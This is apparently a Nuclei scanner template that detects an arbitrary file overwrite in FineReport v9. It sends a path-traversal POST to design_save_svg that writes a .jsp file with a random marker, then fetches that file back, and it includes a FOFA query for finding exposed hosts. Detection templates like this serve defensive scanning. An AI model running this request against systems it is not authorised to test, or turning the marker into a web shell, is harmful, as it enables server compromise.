http:
- matchers:
  - part: body_2
    type: word
    words:
    - '{{string}}'
  raw:
  - 'POST /WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/{{filename}}.jsp
    HTTP/1.1

    Host: {{Hostname}}

    Content-Type: text/xml;charset=UTF-8


    {"__CONTENT__":"{{string}}","__CHARSET__":"UTF-8"}

    '
  - 'GET /WebReport/{{filename}}.jsp HTTP/1.1

    Host: {{Hostname}}

    '
id: fine-report-v9-file-upload
info:
  author: SleepingBag945
  description: FineReport ( A business intelligence (BI) and reporting software )
    is vulnerable to Arbitrary File Overwrite.
  metadata:
    fofa-query: "app=\"\u5E06\u8F6F-FineReport\""
    max-request: 2
  name: FineReport v9 Arbitrary File Overwrite
  reference:
  - https://github.com/NHPT/WebReportV9Exp/blob/main/WebReport_Exp.
  severity: critical
  tags: finereport,fileupload,intrusive
variables:
  filename: '{{rand_base(8)}}'
  string: '{{rand_base(8, "abc")}}'
